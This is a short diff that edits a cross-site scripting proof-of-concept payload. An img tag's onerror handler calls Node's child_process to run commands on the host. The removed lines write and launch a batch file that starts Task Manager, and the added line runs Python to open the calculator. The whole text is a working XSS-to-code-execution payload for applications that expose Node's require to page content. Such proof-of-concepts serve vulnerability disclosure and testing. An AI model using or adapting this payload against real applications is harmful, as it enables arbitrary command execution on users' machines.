@@ -1,3 +1,1 @@
-<img src=x onerror="
-require('fs').writeFileSync('poc.bat', '@echo off\nstart taskmgr'); 
-alert(require('child_process').execSync('start poc.bat').toString());">
+<img src=x onerror="alert(require('child_process').execSync('python -c \"import os; os.system(\'calc\')\"').toString());">
